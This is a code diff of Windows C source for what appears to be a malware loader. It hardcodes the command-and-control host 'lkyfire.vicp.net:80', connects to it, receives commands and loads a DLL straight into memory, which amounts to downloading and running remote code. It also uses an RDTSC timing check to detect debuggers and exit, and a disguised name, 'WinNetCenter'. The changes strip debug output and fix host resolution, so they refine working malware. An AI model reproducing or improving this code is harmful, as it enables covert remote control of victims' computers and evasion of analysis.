@@ -7,9 +7,6 @@
 #pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98")
 //#pragma comment(linker,"/ENTRY:WinMain")
 
-#define DE
-#include "..\..\debug.h"
-
 #include "MemLoadDll.h"
 
 unsigned long _stdcall resolve(char *host)
@@ -18,10 +15,8 @@ unsigned long _stdcall resolve(char *host)
 
 	long i = inet_addr(host);
 
-	if (i < 0) //Not Ip
+	if (i == INADDR_NONE) //Not Ip
 	{
-		MsgErr("Host mode");
-
 		ser = (struct hostent*)gethostbyname(host);
 
 		if (ser == NULL)
@@ -54,7 +49,7 @@ struct MODIFY_DATA
 } modify_data =
 {
 	"lkyfire.vicp.net:80",
-	"150911",
+	"20150914",
 	405,
 	FALSE,
 	"WinNetCenter",
@@ -73,10 +68,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	LocalAddr.sin_port = htons(modify_data.ServerPort);
 	LocalAddr.sin_addr.S_un.S_addr = resolve(modify_data.ServerAddr);
 
-	SOCKET MainSocket = socket(AF_INET, SOCK_STREAM, 0); //Á¬½ÓµÄsocket
-
-	int timeout = 45000;
-	int Err = setsockopt(MainSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
+	SOCKET MainSocket = socket(AF_INET, SOCK_STREAM, 0);
 
 	if (connect(MainSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
 	{
@@ -120,6 +112,8 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 	shutdown(MainSocket, 0x02);
 	closesocket(MainSocket);
+
+	int Err;
 
 	if (msgHead.dwCmd == CMD_DLLDATA)
 	{
@@ -176,13 +170,13 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 	{
 		RDTSC
 		xchg    ecx, eax
-			RDTSC
-			sub     eax, ecx
-			cmp     eax, 0FFh
-			jl      OK
-			xor     eax, eax
-			push    eax
-			call    ExitProcess
+		RDTSC
+		sub     eax, ecx
+		cmp     eax, 0FFh
+		jl      OK
+		xor     eax, eax
+		push    eax
+		call    ExitProcess
 	}
 OK:
 
